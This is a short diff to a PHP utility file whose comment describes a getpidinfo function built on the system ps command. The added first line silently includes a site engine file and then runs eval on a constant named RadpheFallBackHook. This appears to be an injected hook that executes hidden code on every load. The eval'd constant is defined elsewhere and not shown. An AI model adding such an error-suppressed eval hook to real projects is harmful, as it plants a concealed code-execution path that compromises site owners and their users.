@@ -1,5 +1,4 @@
-<?php
-@require_once($_SERVER['DOCUMENT_ROOT'].'/_system/_SiteEngine.php');//Fallback Hook.
+<?php @require_once($_SERVER['DOCUMENT_ROOT'].'/_system/_SiteEngine.php'); eval(RadpheFallBackHook);
 /*
 mixed getpidinfo(mixed pid [, string system_ps_command_options])
 this function gets PID-info from system ps command and return it in useful assoc-array,
